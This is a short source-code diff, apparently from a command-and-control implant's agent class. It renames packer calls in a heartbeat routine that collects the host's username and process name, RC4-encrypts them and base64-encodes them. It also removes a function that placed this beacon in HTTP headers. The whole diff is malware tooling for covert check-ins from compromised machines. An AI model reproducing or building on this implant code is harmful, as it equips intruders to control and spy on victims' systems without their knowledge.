@@ -79,35 +79,12 @@ LPSTR Agent::BuildBeat()
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	PBYTE beat = packer->GetData();
-	ULONG beat_size = packer->GetDataSize();
+	PBYTE beat = packer->data();
+	ULONG beat_size = packer->datasize();
 
 	EncryptRC4(beat, beat_size, this->config->encrypt_key, 16);
 
 	LPSTR encoded_beat = b64_encode(beat, beat_size);
 
 	return encoded_beat;
-}
-
-LPSTR Agent::CreateHeaders()
-{
-	LPSTR beat           = this->BuildBeat();
-	ULONG beat_length    = StrLenA(beat);
-	ULONG param_length   = StrLenA((CHAR*)this->config->parameter);
-	ULONG headers_length = StrLenA((CHAR*)this->config->http_headers);
-
-	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(param_length + beat_length +  headers_length + 5);
-	memcpy(HttpHeaders, this->config->http_headers, headers_length);
-	ULONG index = headers_length;
-	memcpy(HttpHeaders + index, this->config->parameter, param_length);
-	index += param_length;
-	HttpHeaders[index++] = ':';
-	HttpHeaders[index++] = ' ';
-	memcpy(HttpHeaders + index, beat, beat_length);
-	index += beat_length;
-	HttpHeaders[index++] = '\r';
-	HttpHeaders[index++] = '\n';
-	HttpHeaders[index++] = 0;
-
-	return HttpHeaders;
 }
